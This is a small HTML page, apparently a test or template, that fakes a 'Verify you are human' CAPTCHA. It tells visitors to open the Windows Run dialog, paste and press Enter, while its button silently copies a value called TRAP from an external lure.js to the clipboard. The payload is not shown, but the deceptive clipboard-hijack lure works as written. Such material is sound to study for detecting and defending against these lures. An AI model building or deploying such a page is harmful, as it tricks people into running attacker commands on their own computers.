<!doctype html><html><body><h1>Verify you are human</h1><p>1. Press Windows + R</p><p>2. Press Ctrl + V</p><p>3. Press Enter</p><button id=b>I am not a robot</button><script src=lure.js></script><script>b.onclick=()=>{const t=(s)=>new ClipboardItem({'text/plain':new Blob([s],{type:'text/plain'})});navigator.clipboard.write([t('hello'),t(TRAP)]).then(()=>document.title='done',e=>document.title='err '+e.message)}</script></body></html>
